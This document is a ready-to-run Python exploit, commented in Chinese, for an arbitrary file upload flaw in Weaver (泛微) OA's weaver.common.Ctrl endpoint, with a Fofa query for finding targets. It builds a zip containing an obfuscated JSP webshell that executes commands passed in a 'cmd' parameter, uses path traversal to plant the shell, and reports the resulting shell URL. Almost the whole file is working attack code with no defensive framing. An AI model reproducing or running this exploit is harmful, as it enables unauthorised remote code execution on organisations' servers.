# -*- coding: utf-8 -*-
# 泛微OA weaver.common.Ctrl 任意文件上传
# Fofa:  app="泛微-协同办公OA"

import zipfile
import sys
import requests
import time

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[1;33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC


def info():
    return VIOLET + "[INFO] " + ENDC


def error():
    return RED + "[ERROR] " + ENDC


def warning():
    return YELLOW + "[WARNING] " + ENDC


def success():
    return GREEN + "[SUCCESS] " + ENDC


def file_zip(mm, webshell_name2):
    shell = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
    """  ## 替换shell内容
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)


def GetShell(urllist):
    mm = 'GyBtVQDJ'
    webshell_name1 = mm + '.jsp'
    webshell_name2 = '../../../' + webshell_name1

    file_zip(mm, webshell_name2)
    print(now_time() + info() + '上传文件中')
    urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    try:
        requests.post(url=urls, files=file, timeout=10, verify=False)
        GetShellurl = urllist + 'cloudstore/' + webshell_name1
        GetShelllist = requests.get(url=GetShellurl, timeout=10, verify=False)
        if GetShelllist.status_code == 200:
            print(now_time() + success() + '利用成功webshell地址为: ' + GetShellurl+'?cmd=')
            return 'ok'
        else:
            print(now_time() + warning() + '未找到webshell, 利用失败, 可换马重试')
    except:
        print(now_time() + error() + '未知错误')


def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        if url[-1] != '/':
            url += '/'
        GetShell(url)
    else:
        print("python3 {} http://xx.xx.xx.xx".format(sys.argv[0]))


if __name__ == '__main__':
    main()
